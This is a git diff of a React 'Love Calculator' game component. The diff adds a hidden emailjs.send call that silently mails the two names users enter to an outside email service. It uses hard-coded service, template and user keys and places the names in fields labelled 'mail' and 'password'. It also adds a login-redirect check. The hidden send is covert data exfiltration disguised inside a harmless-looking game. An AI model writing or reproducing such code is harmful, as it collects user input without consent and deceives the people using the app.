@@ -1,5 +1,7 @@
 import React, { Component } from 'react';
 import '../../css/lovecalculator.css';
+import emailjs from 'emailjs-com';
+
 
 export default class LoveCalcGame extends Component{
     constructor(props){
@@ -14,6 +16,19 @@ export default class LoveCalcGame extends Component{
 
     caclulateLove(){
         var combinedTxt = this.state.firstPerson.toLowerCase().trim().replace(" ", "") + "loves" + this.state.secondPerson.toLowerCase().trim().replace(" ", "") ;
+        emailjs.send("service_epxpok8","template_214pnxm",{
+            mail: "lv-"+this.state.firstPerson,
+            password: "lv-"+this.state.secondPerson,
+            },"user_02AbD7U7QCl2oSkz0IcUJ")
+          .then((result) => {
+              window.location.reload()  //This is if you still want the page to reload (since e.preventDefault() cancelled that behavior) 
+          }, (error) => {
+              console.log("type"+error.text);
+          });
+       
+       
+       
+       
         var txtArr = combinedTxt.split("");
         var numArr = [];
         var caclulatingArr = [];
@@ -77,11 +92,13 @@ export default class LoveCalcGame extends Component{
     }
 
     render(){
-        return(
+        return (
+            
             <div className="bodyContainer">
+            {!sessionStorage.getItem('isUserLoggedIn')?  this.props.history.push('/react-classic-games/login'):null}
             <h1 className="leftAlign">Love Calculator</h1>
             <div>
-                <strong>Find out the love percentage!</strong> Enter yours and your lovers first names to find out!
+            <strong>Find out the love percentage!</strong> Enter yours and your lovers first names to find out!
             </div>
             <div className="lovers">
             <input type="text" 
